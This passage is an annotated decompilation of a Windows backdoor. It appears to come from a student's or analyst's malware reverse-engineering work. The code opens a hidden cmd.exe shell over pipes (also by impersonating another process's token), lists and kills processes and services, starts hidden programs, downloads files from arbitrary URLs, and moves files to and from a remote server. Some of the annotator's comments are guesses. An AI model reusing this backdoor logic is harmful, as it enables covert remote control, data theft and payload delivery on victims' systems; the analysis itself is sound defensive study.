        v5 = a3;                                // adjust v5 back to 32
        if ( ++v6 == &openedCMD )               // if the next array address equals 
                                                // dword_4047A0 break
          break;
      }
    }
    if ( ++v4 >= v12 )                          // if v4 is less than the computer name length, return
                                                // v10 + 1
      return v10 + 1;
  }
  return 8;                                     // if previous operation failed, return 8 instead
}
// 4047A0: using guessed type int dword_4047A0;

//----- (00401ACB) --------------------------------------------------------
size_t __cdecl sub_401ACB(HANDLE hNamedPipe, char *ExitCode, int a3)
{
  char *v3; // edi
  int v4; // esi
  unsigned int v6; // [esp+Ch] [ebp-Ch]
  DWORD NumberOfBytesRead; // [esp+10h] [ebp-8h] BYREF
  DWORD BytesRead; // [esp+14h] [ebp-4h] BYREF

  v3 = ExitCode;
  BytesRead = 0;
  NumberOfBytesRead = 0;
  v4 = 0;
  v6 = 0;
  while ( 1 )
  {
    GetExitCodeProcess(hObject, &ExitCode);     // check current status of the pipe
    if ( ExitCode != 259 )                      // if the procces is NOT STILL_ACTIVE, break
      break;
    PeekNamedPipe(hNamedPipe, &v3[v4], 0x10000 - v4, &BytesRead, 0, 0);// copies data from a pipe into buffer v3 without 
                                                // removing it all together from the pipe
    if ( !a3 || BytesRead || v6 >= 0xA )        // enter this if
    {
      NumberOfBytesRead = 0;
      if ( !BytesRead )                         // if no bytes are to be read, return v4
                                                // which will equal totalBytesRead
        return v4;
      if ( !ReadFile(hNamedPipe, &v3[v4], BytesRead, &NumberOfBytesRead, 0) )// if reading from the pipe fails, break
                                                // return total number read
        return v4;
      v4 += NumberOfBytesRead;                  // sum up how much has been read so far
      a3 = 0;                                   // reset a3
      if ( !NumberOfBytesRead )                 // if no bytes have been read, break
        return v4;
    }
    else                                        // if file read was succesful, sleep for a before 
                                                // incrementing v6 and looping
    {
      Sleep(0x32u);
      ++v6;
    }
  }
  openedCMD = 0;
  CloseHandle(hObject);                         // close second pipe
  CloseHandle(dword_404774);                    // close handle
  memset(&hObject, 0, 0x10u);                   // fill the character array hobject with 0
  strcpy(v3, aProcessCmdExeE);                  // overwrite the exit code with
                                                // 'process cmd.exe exited!'
  return strlen(v3);                            // return the length of the phrase
}
// 4047A0: using guessed type int dword_4047A0;

//----- (00401BA9) --------------------------------------------------------
void __cdecl sub_401BA9(char *Destination, void *a2, HANDLE TokenHandle)
{
  HANDLE v3; // esi
  DWORD LastError; // eax
  int v5; // eax
  HANDLE v6; // ebx
  DWORD v7; // eax
  DWORD v8; // eax
  char Source[256]; // [esp+Ch] [ebp-26Ch] BYREF
  CHAR Dst[264]; // [esp+10Ch] [ebp-16Ch] BYREF
  char Buffer[32]; // [esp+214h] [ebp-64h] BYREF
  struct _STARTUPINFOA StartupInfo; // [esp+234h] [ebp-44h] BYREF

  if ( a2 != -1 )                               // if valid read handle was given, do this
  {
    v3 = TokenHandle;                           // v3 = WriteHandle for the pipe
    if ( TokenHandle != -1 )                    // if the WriteHandle is valid, do this
    {
      if ( openedCMD )
      {
        strcat(Destination, aStartedAlready);   // appends 'Started Already' to growing Destination
        sprintf(Buffer, " and the PID is %d\r\n", dword_404778);// prints the PID of the pipe
        strcat(Destination, Buffer);            // appends the previous output to Destination
      }
      else
      {
        if ( !ExpandEnvironmentStringsA(Src, Dst, 0x104u) )// if failed to expand environment and its variables, do this
        {
          GetSystemDirectoryA(Dst, 0x104u);     // grab the current directory and put into the buffer 
                                                // Dst
          strcat(Dst, aCmdExe);                 // append '\cmd.exe'
                                                // presumably to open the command terminal 
        }
        if ( GetFileAttributesA(Dst) == -1 )    // if current file has invalid_file_attributes, do this
        {
          LastError = GetLastError();           // get the error code for the last function performed
          sprintf(Buffer, "GetFileAttributes Error code: %d\r\n", LastError);// print out the GetFileAttributes error code
          strcat(Destination, Buffer);          // and append it to the destination string
        }
        else                                    // else if file attributes returned a valid
                                                // value, do this
        {
          strcat(Destination, aCmdpath);        // append 'CmdPath='
          strcat(Destination, Dst);             // Destination = 'CmdPath=\cmd.exe'
          strcat(Destination, asc_40420C);      // add a new line character to the buffer
          memset(&StartupInfo, 0, sizeof(StartupInfo));// reset the StartupInfo struct at all 0's
          StartupInfo.hStdInput = a2;           // header input/read handler
          StartupInfo.cb = 68;                  // size of structure is 68 bytes
          StartupInfo.dwFlags = 257;            // specifies a newly created windows is to be opened but is
                                                //  to remain hidden from the user
                                                // 
                                                // and the handles of input and output must be
                                                // specified and closed afterwards
          StartupInfo.wShowWindow = 0;          // don't show the window that is created
          StartupInfo.hStdError = v3;           // the error output is the WriteHandle
          StartupInfo.hStdOutput = v3;          // standard WriteHandle from creation is used
          if ( Str && !lpServiceName && (v5 = atol(Str)) != 0 )// if string exists, service name buffer is empty,
                                                // and v5 equals Str as a long integer
          {
            v6 = OpenProcess(0x1F0FFFu, 0, v5); // the process is synchronous, and has all access
            if ( v6 == -1 )                     // if the process creation failed
            {
              v7 = GetLastError();              // get error code
              sprintf(Source, "OpenP failed with %d!\n", v7);// print error code to buffer
              strcat(Destination, Source);      // append error code to Destination
              return;                           // critical failure, break
            }
            if ( OpenProcessToken(v6, 0xBu, &TokenHandle) )// opens process token with writing access
            {
              if ( CreateProcessAsUserA(TokenHandle, 0, Dst, 0, 0, 1, 0, 0, 0, &StartupInfo, &hObject) )// pass token handle,
                                                //      null,
                                                //      'CmdPath:\cmd.exe',
                                                //      0,
                                                //      0,
                                                //      inherit all handles,
                                                //      0,
                                                //      0,
                                                //      0,
                                                //      start up info,
                                                //      pipe header handle
                                                //      
                                                // Creates an invisible command prompt window as user
                openedCMD = 1;                  // trigger flag variable
            }
            else
            {
              v8 = GetLastError();              // get error code
              sprintf(Source, "OpenT failed with %d!\n", v8);// print error code into buffer
              strcat(Destination, Source);      // append last error
            }
            CloseHandle(v6);                    // close process handle
          }
          else if ( CreateProcessA(0, Dst, 0, 0, 1, 0, 0, 0, &StartupInfo, &hObject) )// create cmd terminal without token handle
          {
            openedCMD = 1;                      // set flag variable
          }
          Sleep(0x1F4u);                        // sleep for a while
        }
        if ( openedCMD )                        // if flag was set
          strcat(Destination, aShellStartedSu); // WE STARTED THE SHELL BABY
                                                // 'shell started succesfully!'
        else
          strcat(Destination, aShellStartedFa); // we didn't start a shell... baby.
                                                // 'Shell started fail.'
      }
    }
  }
}
// 404778: using guessed type int dword_404778;
// 4047A0: using guessed type int dword_4047A0;

//----- (00401E12) --------------------------------------------------------
char *__cdecl sub_401E12(char *Destination)
{
  DWORD v1; // ebx
  char *result; // eax
  HANDLE Toolhelp32Snapshot; // ebx
  BOOL i; // eax
  SC_HANDLE v5; // eax
  DWORD v6; // edi
  void *v7; // eax
  const char **v8; // esi
  UINT DriveTypeA; // eax
  UINT v10; // eax
  UINT v11; // eax
  UINT v12; // eax
  UINT v13; // eax
  UINT v14; // eax
  int v15[137]; // [esp+Ch] [ebp-464h] BYREF
  PROCESSENTRY32 pe; // [esp+230h] [ebp-240h] BYREF
  char Buffer[256]; // [esp+358h] [ebp-118h] BYREF
  DWORD pcbBytesNeeded; // [esp+458h] [ebp-18h] BYREF
  CHAR String1[4]; // [esp+45Ch] [ebp-14h] BYREF
  void *v20; // [esp+460h] [ebp-10h]
  SC_HANDLE hSCObject; // [esp+464h] [ebp-Ch]
  DWORD ServicesReturned; // [esp+468h] [ebp-8h] BYREF
  CHAR v23; // [esp+46Fh] [ebp-1h]

  v1 = 0;
  if ( !Str )
    return strcat(Destination, aSyntaxErrorUsa);// append 'Syntax Error' 'Usage:' list /p/s/d
  if ( !strcmpi(aP, Str) )                      // is Str = '/p'
                                                // 
                                                // /p can be used to specify a password to be used
  {
    memset(&pe, 0, sizeof(pe));                 // reset pe structure
    memset(v15, 0, sizeof(v15));                // fill v15[] with 0's
    Toolhelp32Snapshot = CreateToolhelp32Snapshot(2u, 0);// get info on all current threads
    if ( Toolhelp32Snapshot == -1 )
      return strcat(Destination, aListProcessFai);// listing all current processes failed, return
    pe.dwSize = 296;                            // adjusting PROCESSENTRY32 struct value
    v15[0] = 548;                               // []
                                                // 
                                                // 
                                                // process32first is the handle for the snapshot
                                                // that was just made for the processes
                                                // 
    for ( i = Process32First(Toolhelp32Snapshot, &pe); i; i = Process32Next(Toolhelp32Snapshot, &pe) )
    {
      sprintf(Buffer, "%-26s %5d\r\n", pe.szExeFile, pe.th32ProcessID);
      strcat(Destination, Buffer);              // print out all processs IDs and the .exe file associated
                                                // 
    }
    return CloseHandle(Toolhelp32Snapshot);
  }                                             // close the handle
  if ( strcmpi(aS, Str) )                       // if string = '/s'
                                                // 
                                                // /s is used to specificy computer names or IP
                                                // addresses
  {
    result = strcmpi(aD, Str);                  // is Str = '/d'
    if ( !result )
    {
      hSCObject = 0;
      ServicesReturned = GetLogicalDrives();    // If the function succeeds, the return value is a bitmask representing 
                                                // the currently available disk drives. Bit position 0 (the least-significant bit) 
                                                // is drive A, bit position 1 is drive B, bit position 2 
                                                // is drive C, and so on.
                                                // retrieved from microsoft.com
      v23 = 65;                                 // 65h = A
      sprintf(Buffer, aVolumeOnThisCo);         // prints 'Volume on this computer:'
      strcat(Destination, Buffer);              // appends the string to Destination buffer
      while ( ServicesReturned )
      {
        if ( (ServicesReturned & 1) != 0 )
        {
          sprintf(Buffer, "%c:\t", v23);        // prints 'A:' [beginning of the A drive]
          strcat(Destination, Buffer);
          String1[0] = v23;                     // string[0] = 'A'
          String1[1] = 0;
          lstrcatA(String1, asc_4042CC);        // appends ':\' to 'A' so the final
                                                // result becomes 'A:\'
          DriveTypeA = GetDriveTypeA(String1);
          if ( DriveTypeA )                     // determine what kind of drive this is
          {
            v10 = DriveTypeA - 1;
            if ( v10 )
            {
              v11 = v10 - 1;
              if ( v11 )
              {
                v12 = v11 - 1;
                if ( v12 )
                {
                  v13 = v12 - 1;
                  if ( v13 )
                  {
                    v14 = v13 - 1;
                    if ( v14 )
                    {
                      if ( v14 == 1 )
                        strcat(Destination, aRamdisk);// /if DriveTypeA = 6 | RAM disk
                    }
                    else
                    {
                      strcat(Destination, aCdRom);// if DriveType = 5 | CDROM
                    }
                  }
                  else
                  {
                    strcat(Destination, aRemote);// if DriveType = 4 | Remote
                  }
                }
                else
                {
                  strcat(Destination, aFixed);  // if DriveType = 3 | Fixed drive
                }
              }
              else
              {
                strcat(Destination, aRemoveable);// if DriveType = 2 | Removable drive
              }
            }
            else
            {
              strcat(Destination, aInvalid);    // There is no valid root path
            }
          }
          else
          {
            strcat(Destination, aUnkown);       // drive type cannot be determined
          }
          if ( GetVolumeInformationA(String1, &pe.dwFlags, 0x105u, 0, 0, 0, 0, 0) )// collects info on the file system's volume
                                                // from a specified root directory
            strcat(Destination, &pe.dwFlags);   // appends '0'?
          strcat(Destination, asc_4040B4);      // appends a new line
          hSCObject = (hSCObject + 1);
        }
        ServicesReturned >>= 1;                 // if there was more than one drive, run it again
        ++v23;                                  // shift to next drive
      }
      sprintf(Buffer, "\r\nTotally %d volumes found.\r\n", hSCObject);// returns file path name with its volume
      return strcat(Destination, Buffer);       // append the total volume found
    }
  }
  else
  {
    v5 = OpenSCManagerA(0, 0, 4u);              // connects to the local service control manager
    hSCObject = v5;
    if ( !v5 )
      return strcat(Destination, aListServiceFai);// connection failed, return
    EnumServicesStatusExA(v5, SC_ENUM_PROCESS_INFO, 0x30u, 1u, 0, 0, &pcbBytesNeeded, &ServicesReturned, 0, 0);// handle,
                                                // [retrieving info on name and service status
                                                // info in he database],
                                                // [enumerate own and shared processes],
                                                // [enumerate active services only],
                                                // [null - Max Array Size],
                                                // [0 - Max Array Size],
                                                // [pointer],
                                                // [pointer],
                                                // 
    v6 = pcbBytesNeeded + 1;
    v7 = operator new(pcbBytesNeeded + 1);
    v20 = v7;
    if ( !v7 )
    {
      CloseServiceHandle(hSCObject);            // listing services failed, return
      return strcat(Destination, aListServiceFai);
    }
    EnumServicesStatusExA(hSCObject, SC_ENUM_PROCESS_INFO, 0x30u, 1u, v7, v6, &pcbBytesNeeded, &ServicesReturned, 0, 0);// first 4 variables the same,
                                                // [size of array to recieve info],
                                                // [v6 - size of buffer],
                                                // [pointer],
                                                // [pointer]
    if ( ServicesReturned )
    {
      v8 = v20;
      do
      {
        sprintf(Buffer, "%-24s %s\r\n", *v8, v8[1]);// print out the acquired services
        strcat(Destination, Buffer);
        ++v1;
        v8 += 11;
      }
      while ( v1 < ServicesReturned );          // make sure to list from every drive
    }
    operator delete(v20);                       // deallocate memory
    return CloseServiceHandle(hSCObject);       // close service manager handle
  }
  return result;
}

//----- (00402132) --------------------------------------------------------
char *__cdecl sub_402132(char *Destination)
{
  char *result; // eax
  int v2; // eax
  HANDLE v3; // eax
  void *v4; // esi
  SC_HANDLE v5; // eax
  SC_HANDLE v6; // edi
  SC_HANDLE v7; // esi
  struct _SERVICE_STATUS ServiceStatus; // [esp+Ch] [ebp-20h] BYREF
  BOOL v9; // [esp+28h] [ebp-4h]

  if ( !lpServiceName )
    return strcat(Destination, aSyntaxErrorUsa_0);// if there's no valid service name,
                                                // append 'Syntax error! Usage: kill /p|/s <pid|serviceName>'
  if ( strcmpi(aP, Str) )                       // if str = '/p'
  {
    result = strcmpi(aS, Str);                  // does Str = '/s'
    if ( !result )                              // if Str == '/s'
    {
      v5 = OpenSCManagerA(0, 0, 4u);            // open a process as an administrator
      v6 = v5;                                  // v6 = the service manager handle
      if ( v5 )                                 // if function was succesful, perform this
      {
        v7 = OpenServiceA(v5, lpServiceName, 0xF003Fu);// just created administrator service handle,
                                                // name of the service to be opened,
                                                // access code gives SC_MANAGER_ALL_ACCESS
                                                // (can create service, connect to control manager,
                                                // lock database, [backdoor beginning?]
                                                // save the current boot config for later use)
        if ( v7 )                               // if the service was created, run this
        {
          if ( ControlService(v7, 1u, &ServiceStatus) )// handle of the service to be controlled,
                                                // code for stop service?,
                                                // current service status from structure
          {
            switch ( ServiceStatus.dwCurrentState )// whats the current status?
            {
              case 1u:                          // stopped
                strcat(Destination, aServiceStopped);// append 'service stopped'
                break;
              case 3u:
                strcat(Destination, aServiceStopPen);// appened 'process stop pending'
                break;
              case 4u:                          // still running
                strcat(Destination, aServiceStillRu);// append 'process still running'
                break;
            }
          }
          else if ( GetLastError() == 1062 )    // error code for 'service not started'
          {
            strcat(Destination, aServiceDoesnTS);// append 'service doesn't start'
          }
          else
          {
            strcat(Destination, aControlservice);// append 'control service failed'
          }
          CloseServiceHandle(v7);               // close handle for administrator service
          return CloseServiceHandle(v6);        // close administrator service manager
        }
        else
        {
          if ( GetLastError() == 1060 )         // error code for service doesn't exist
            strcat(Destination, aServiceDoesNot);// appends 'service doesn't exist'
          else
            strcat(Destination, aOpenserviceFai);// append 'control service failed'
          return CloseServiceHandle(v6);        // close the administrator service manager
        }
      }
      else
      {
        return strcat(Destination, aOpenscmanagerF);// append 'opening service control manager failed'
      }
    }
  }
  else
  {
    v2 = atoi(lpServiceName);                   // v2 = service name as an integer
    v3 = OpenProcess(0x1F0FFFu, 0, v2);         // open a process with PROCESS_ALL_ACCESS
    v4 = v3;                                    // save the handle for that process
    if ( v3 != -1 )
    {
      v9 = TerminateProcess(v3, 1u);            // terminates the process, because it was given
                                                // full access
      CloseHandle(v4);                          // close the handle of the now terminated process
    }
    if ( v9 )
      return strcat(Destination, aOk);          // appends 'Ok!'
    else
      return strcat(Destination, aFailed);      // appends 'Failed!'
  }                                             // return
  return result;
}

//----- (00402292) --------------------------------------------------------
int __stdcall StartAddress(char *lpThreadParameter)
{
  int Was_Infected; // esi
  _BYTE *bufferPointer2; // esi
  char *BackslashPointer; // eax
  HANDLE FileA; // eax
  int v5; // edi
  DWORD FileSize; // eax
  DWORD v7; // edi
  DWORD v8; // eax
  int v9; // eax
  char Str[256]; // [esp+Ch] [ebp-290h] BYREF
  CHAR FileName[260]; // [esp+10Ch] [ebp-190h] BYREF
  char Buffer[64]; // [esp+210h] [ebp-8Ch] BYREF
  HINTERNET v14[10]; // [esp+250h] [ebp-4Ch] BYREF
  DWORD FileSizeHigh; // [esp+278h] [ebp-24h] BYREF
  BOOL v16; // [esp+27Ch] [ebp-20h]
  LPCVOID lpBuffer; // [esp+280h] [ebp-1Ch]
  int v18; // [esp+284h] [ebp-18h]
  HANDLE hFile; // [esp+288h] [ebp-14h]
  DWORD NumberOfBytesRead; // [esp+28Ch] [ebp-10h] BYREF
  int v21; // [esp+298h] [ebp-4h]
  int Destination; // [esp+2A4h] [ebp+8h]

  v18 = 0;
  sub_40101C(v14, szReferrer, aMozilla50, szReferrer, szReferrer, 1, 60000);// sets up parameteres for latter functions calls
                                                // when using network functions
  v21 = 0;
  if ( !::Buffer )                              // buffer isn't empty?
  {
    strcat(lpThreadParameter, aSyntaxErrorUsa_3);// append error message
    Was_Infected = 0;
    goto LABEL_54;                              // exit program, critical failure
  }
  bufferPointer2 = operator new(0x200C8u);      // new allocation
  lpBuffer = bufferPointer2;                    // lpBuffer references newly allocated memory
  *bufferPointer2 = 0;                          // initilization of variable
  if ( bufferPointer2 )                         // if pointer points to something,
                                                // enter
  {
    if ( !strcmpi(String2, aPutf) )             // if string equals putf function
                                                // [Write a formatted string into a specific file]
      v18 = 1;
    strcpy(FileName, ::Str);                    // create filename from a global string
    if ( v18 )                                  // if string2 equals putf
    {
      BackslashPointer = strrchr(::Str, 92);    // find the last occurence of a '\' character 
                                                // and save a pointer of it to this
      if ( BackslashPointer )                   // if a backslash pointer was found
        strcpy(FileName, BackslashPointer + 1); // Filename is now equal to the last backslash found in the global string
                                                // 
                                                // ///////////
                                                // if we had C:\example\golden
                                                // FileName would equal 'golden'
      FileA = CreateFileA(FileName, 0x40000000u, 1u, 0, 2u, 0x80u, 0);// create a file using that name,
                                                // ~~~~~~~~ presumably read/write access,
                                                // other processes can read this file,
                                                // no security attributes,
                                                // create a new file always even if it already exists,
                                                // no specific flags set FILE_ATTRIBUTE_NORMAL
    }
    else
    {
      FileA = CreateFileA(FileName, 0x80000000, 1u, 0, 3u, 0x80u, 0);// same as the previous create file operation, except this
                                                // time instead of OPEN_ALWAYS, the security is set to
                                                // OPEN_EXISTING
    }
    hFile = FileA;                              // hFile is the handle for the file just created
    if ( FileA != -1 )                          // if handle is valid
    {
      if ( v18 )                                // if(1) if ::Str equaled putf
      {
        v5 = atoi(String);                      // convert string into integer value
        goto LABEL_17;                          // jump ahead
      }                                         // if v18 = 0, do this
      FileSize = GetFileSize(hFile, &FileSizeHigh);// grab teh filesize of the new file
      v5 = FileSize;                            // save it
      if ( FileSize != -1 && !FileSizeHigh )    // if file exists, and doesn't exceed capacity
      {
        sprintf(Buffer, "FileSize:\t%d", FileSize);// print the current filesize
LABEL_17:
        sscanf(::Buffer, "%*[^/]%*[/]%*[^/]%s", Str);// find where in the buffer /****/****/****/String exists
        sub_401199(v14, dword_404794);          // update whats saved in this[6]
        sub_4011DE(v14, Str);                   // update this[5]
        if ( !v18 )
          sub_401280(v14, Buffer);              // update this[8]
                                                // 
                                                // updating the values that previously held szReferrer
        if ( EstablishConnection_Timeouts(v14) )// if successful in contacting a server
        {
          Destination = v5;                     // previous filesize or appeneded string is destination
          while ( 1 )
          {
            CloseInternetHandles(v14);          // close current internet handles
            if ( !EstablishConnection_Timeouts(v14) )
            {
              CloseInternetHandles(v14);        // If connection failed, jump here
              goto LABEL_49;
            }
            NumberOfBytesRead = 0;
            v7 = 0x20000;
            if ( !v18 )
            {
              v8 = 0x20000;
              if ( Destination <= 0x20000 )
                v8 = Destination;
              Destination -= v8;                // subtract v8 from destination to get number of bytes
                                                // to be read
              ReadFile(hFile, bufferPointer2, v8, &NumberOfBytesRead, 0);// read the file for v8 number of bytes
            }
            v16 = sub_4012C5(v14, bufferPointer2, NumberOfBytesRead);// established certain security options for the handles
            if ( v16 )                          // if that was successful
            {
              if ( v18 )                        // and we're running a specific version, break out the while loop
                break;
            }
LABEL_45:
            if ( Destination <= 0 || !v16 )     // if there's nothing left to read in destination or,
                                                // with setting teh security options, critical failure
                                                // break immediately
              goto LABEL_49;                    // begin clean up of handles and memory allocation
          }
          if ( Destination <= 0x20000 )         // if the filesize is less than
            v7 = Destination;                   // v7 is equal to filesize
          while ( 1 )
          {
            v16 = ReadInternetFile(v14, bufferPointer2, v7, &NumberOfBytesRead);// reads a file from the established connection
            if ( strstr(bufferPointer2, SubStr) )// if the substring is found in the file,
                                                // [is the file already infected, break]
              break;
            v9 = 0;
            if ( NumberOfBytesRead > 3 )
            {
              while ( bufferPointer2[v9] != 13
                   || bufferPointer2[v9 + 1] != 10
                   || bufferPointer2[v9 + 2] != 13
                   || bufferPointer2[v9 + 3] != 10 )// While not at the end, do this
              {
                if ( ++v9 + 3 >= NumberOfBytesRead )// skip ahead if enough bytes have been processed
                  goto LABEL_41;
              }
              if ( v9 + 4 == NumberOfBytesRead )// if nearing the end, exit
              {
                NumberOfBytesRead = 0;          // reset numberofbytes read
              }
              else
              {
                bufferPointer2[NumberOfBytesRead] = 0;
                NumberOfBytesRead += -4 - v9;   // reduce number of bytes read
                                                // [Meaning, those values have already been processed]
                lpBuffer = &bufferPointer2[v9 + 4];// update the pointer destination
              }
            }
LABEL_41:
            if ( v16 )                          // if the server file was successfuly read
            {
              v7 = NumberOfBytesRead;           // save number of bytes read
              WriteFile(hFile, lpBuffer, NumberOfBytesRead, &NumberOfBytesRead, 0);// copy the contents of the server file into the previously
                                                // created file
            }
            Destination -= v7;                  // calculate how many bytes are left to read
            lpBuffer = bufferPointer2;          // adjust buffer pointer to next position
            if ( !NumberOfBytesRead || !v16 )   // if there's nothing left to read, jump here
              goto LABEL_45;
          }
        }
      }
    }
LABEL_49:
    if ( lpBuffer )                             // if the buffer is still open
      operator delete(bufferPointer2);          // delete it
  }
  if ( hFile != -1 )                            // if the created file is still open
    CloseHandle(hFile);                         // delete it
  Was_Infected = 1;                             // flag variable, showcasing that the process was succesful.
                                                // Infection was completed
LABEL_54:
  v21 = -1;                                     // flag variable, Critical Failure
  DeallocateServerParameters(v14);
  return Was_Infected;
}
// 402292: using guessed type HINTERNET var_4C[10];
// 402292: using guessed type char Str[256];

//----- (004025A2) --------------------------------------------------------
BOOL __cdecl sub_4025A2(char *Destination, HINTERNET *a2, HANDLE hFile)
{
  unsigned int v3; // ebx
  char *Destinationa; // [esp+14h] [ebp+8h]

  v3 = 0;
  if ( openedCMD )                              // if a command terminal was opened
  {
    strcat(Destination, aShellStartedWa);       // append 'shell started, wait to terminate it'
    sub_40199F(aExit, hFile);                   // writes 'exit' to hfile, pipe's write handle
    WaitForSingleObject(hObject, 0xFFFFFFFF);   // wait till the pipe's read handle recieves something
    openedCMD = 0;                              // reset flag variable
    strcat(Destination, aOk_0);                 // append 'Ok!'
  }
  strcat(Destination, aSoLong);                 // appends 'So Long!'
  Destinationa = strlen(Destination);           // save the current length of the destination buffer
  CloseInternetHandles(a2);                     // close the internet handles of v22
  do
  {
    if ( EstablishConnection_Timeouts(a2) )     // establish a connection with timeouts enabled
      break;
    CloseInternetHandles(a2);                   // now close those handles
    ++v3;                                       // increment 
    Sleep(0xEA60u);                             // sleep
  }
  while ( v3 < 5 );                             // repeat 5 times
                                                // 
                                                // hiding connections made by flooding with
                                                // useless connections??
  return sub_4012C5(a2, Destination, Destinationa);// open an http request handle
}
// 4047A0: using guessed type int dword_4047A0;

//----- (00402645) --------------------------------------------------------
char *__cdecl sub_402645(char *Destination)
{
  char *result; // eax
  SC_HANDLE v2; // eax
  SC_HANDLE v3; // ebx
  SC_HANDLE v4; // eax
  SC_HANDLE v5; // edi
  struct _STARTUPINFOA StartupInfo; // [esp+Ch] [ebp-54h] BYREF
  struct _PROCESS_INFORMATION ProcessInformation; // [esp+50h] [ebp-10h] BYREF

  if ( !lpServiceName )                         // if invalid service name is given
    return strcat(Destination, aSyntaxErrorUsa_1);// append the syntax error message to passed in string
  if ( strcmpi(aP, Str) )                       // if str = '/p'
  {
    result = strcmpi(aS, Str);                  // if str = '/s'
    if ( !result )                              // no? do this
    {
      v2 = OpenSCManagerA(0, 0, 4u);            // open local service manager,
                                                // open SERVICES_ACTIVE_DATABASE,
                                                // open as ADMIN
      v3 = v2;                                  // save the handle for the manager here
      if ( v2 )                                 // if process SCManager was created
      {
        v4 = OpenServiceA(v2, lpServiceName, 0xF003Fu);// open service using admin manager handle,
                                                // using specified service,
                                                // with manager all access
        v5 = v4;                                // save the handle for the service here
        if ( v4 )                               // if service was created
        {
          if ( StartServiceA(v4, 0, 0) )        // start the recently opened service
          {
            strcat(Destination, aServiceStarted);// append 'Service started!'
          }
          else if ( GetLastError() == 1056 )    // service already running
          {
            strcat(Destination, aServiceIsRunni);// append 'service already running'
          }
          else
          {
            strcat(Destination, aStartserviceFa);// append 'service start failed'
          }
          CloseServiceHandle(v5);               // close the service
          return CloseServiceHandle(v3);        // close admin service control manager
        }
        else
        {
          if ( GetLastError() == 1060 )         // if service doesn't exist
            strcat(Destination, aServiceDoesNot);// append 'service doesn't exist!'
          else
            strcat(Destination, aStartserviceFa);// append 'StartService failed!'
          return CloseServiceHandle(v3);        // close the admin service control manager
        }
      }
      else
      {
        return strcat(Destination, aOpenscmanagerF);// append opening service manager failed
      }
    }
  }
  else
  {
    memset(&StartupInfo, 0, sizeof(StartupInfo));// clear current startup info
    StartupInfo.cb = 68;                        // size of structure
    StartupInfo.wShowWindow = 0;                // make window hidden
    StartupInfo.dwFlags = 1;                    // the WShowWindow field has extra info
    if ( CreateProcessA(0, lpServiceName, 0, 0, 1, 0, 0, 0, &StartupInfo, &ProcessInformation) )// create a process using the processinfo struct,
                                                // in an invisible window
                                                // 
      strcat(Destination, aProgramStarted);     // append 'Program Started!'
    else
      strcat(Destination, aCreateprocessF);     // append 'CreateProcess Failed.'
    CloseHandle(ProcessInformation.hProcess);   // close the process being referenced by 
                                                // ProcessInformation
    return CloseHandle(ProcessInformation.hThread);// close the thread associated with the 
                                                // just now closed process
  }
  return result;
}

//----- (004027A8) --------------------------------------------------------
char *__cdecl sub_4027A8(char *Destination)
{
  int v1; // eax

  if ( !lpServiceName || !Str )
    return strcat(Destination, aSyntaxError);   // append 'Syntax Error'
  v1 = atol(Str);                               // convert str to long
  return sub_402817(Destination, lpServiceName, v1);// run a process specified in lpServiceName
}

//----- (004027E6) --------------------------------------------------------
char *__cdecl sub_4027E6(char *Destination)
{
  if ( Str && lpServiceName )                   // if str and service names exist
    return URLDownloadToFileA(0, Str, lpServiceName, 0, 0);// download bits from the internet and
                                                // save them to a file
  else
    return strcat(Destination, aSyntaxErrorUsa_2);// append 'Syntax error' on fail
}

//----- (00402817) --------------------------------------------------------
int __cdecl sub_402817(char *Destination, const char *a2, DWORD dwProcessId)
{
  HANDLE CurrentProcess; // eax
  DWORD LastError; // eax
  DWORD v6; // eax
  DWORD v7; // eax
  CHAR CommandLine[260]; // [esp+4h] [ebp-260h] BYREF
  char Buffer[256]; // [esp+108h] [ebp-15Ch] BYREF
  struct _STARTUPINFOA StartupInfo; // [esp+208h] [ebp-5Ch] BYREF
  struct _PROCESS_INFORMATION ProcessInformation; // [esp+24Ch] [ebp-18h] BYREF
  int v12; // [esp+25Ch] [ebp-8h]
  HANDLE TokenHandle; // [esp+260h] [ebp-4h] BYREF
  void *dwProcessIda; // [esp+274h] [ebp+10h]

  v12 = 0;
  if ( dwProcessId )
    CurrentProcess = OpenProcess(0x1F0FFFu, 0, dwProcessId);// open specified process with ALL_ACCESS
  else
    CurrentProcess = GetCurrentProcess();       // else get the current process
  dwProcessIda = CurrentProcess;                // save currentprocess id
  if ( CurrentProcess == -1 )                   // if no process is currently running, or
                                                // failed to open one
  {
    LastError = GetLastError();
    sprintf(Buffer, "Failed with %d!\n", LastError);
    strcat(Destination, Buffer);                // save the corresponding error to the destination
                                                // buffer and return
    return 0;
  }
  else
  {
    if ( OpenProcessToken(CurrentProcess, 0xBu, &TokenHandle) )// if process access token is opened with TOKEN_WRITE access
    {
      memset(&StartupInfo, 0, sizeof(StartupInfo));// reset startup info
      StartupInfo.cb = 68;                      // size of bytes
      StartupInfo.dwFlags = 1;                  // check wShowWindow for more info
      StartupInfo.wShowWindow = 0;              // open an invisible window
      sprintf(CommandLine, "\"%s\"", a2);       // commandline = servicename
      if ( CreateProcessAsUserA(TokenHandle, 0, CommandLine, 0, 0, 1, 0, 0, 0, &StartupInfo, &ProcessInformation) )// 
                                                // run this commandline option in an invisible window
      {
        strcat(Destination, aOk_1);             // append 'Ok!'
        CloseHandle(ProcessInformation.hProcess);// close process
        CloseHandle(ProcessInformation.hThread);// close thread
        v12 = 1;                                // trigger flag variable
      }
      else
      {
        v6 = GetLastError();
        sprintf(Buffer, "Create failed with %d!\n", v6);
        strcat(Destination, Buffer);            // if failed, appened error message
      }
      CloseHandle(TokenHandle);                 // close the access token handle
    }
    else
    {
      v7 = GetLastError();
      sprintf(Buffer, "Failed with %d!\n", v7);
      strcat(Destination, Buffer);              // append the error message
    }
    CloseHandle(dwProcessIda);                  // close current process using its pid
    return v12;                                 // return success or fail
  }
}

//----- (0040297D) --------------------------------------------------------
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
  void *v4; // edi
  DWORD v6; // ecx
  _BYTE *v7; // eax
  char Destination[36]; // [esp+Ch] [ebp-28h] BYREF
  DWORD nSize; // [esp+30h] [ebp-4h] BYREF

  nSize = strlen(byte_4046C8);                  // nSize is one byte
  v4 = operator new(nSize + 1);                 // allocate memory for v4
  if ( !v4 )                                    // if failed allocation, return 1
    return 1;
  memset(v4, 0, nSize + 1);                     // fill v4 with 0's
  v6 = 0;
  if ( nSize )                                  // if(1)
  {
    v7 = v4;                                    // v7 = the allocated memory
    do
    {
      ++v6;                                     // increment v6
      *v7 = (v7[byte_4046C8 - v4] >> 1) & 0x7F; // triggering a flag bit?
      ++v7;                                     // increment v7
    }
